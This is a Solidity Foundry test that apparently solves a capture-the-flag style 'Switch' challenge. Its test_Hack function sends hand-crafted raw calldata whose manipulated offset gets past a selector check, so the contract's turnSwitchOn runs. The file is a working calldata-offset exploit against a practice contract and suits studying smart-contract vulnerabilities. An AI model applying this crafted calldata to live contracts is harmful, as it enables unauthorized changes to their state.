// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Switch} from "../src/switch/Switch.sol";
import {Test, console2} from "forge-std/Test.sol";


contract SwitchTest is Test {
    Switch public sc;

    function setUp() public {
        sc = new Switch();
    }

    function test_Hack() public {
        bytes4 offSelector = bytes4(keccak256("turnSwitchOff()"));
        bytes4 onSelector = bytes4(keccak256("turnSwitchOn()"));
        console2.logBytes4(offSelector);
        console2.logBytes4(onSelector);
        address(sc).call(hex"30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000420606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000");
        assertEq(sc.switchOn(), true);
    }
}
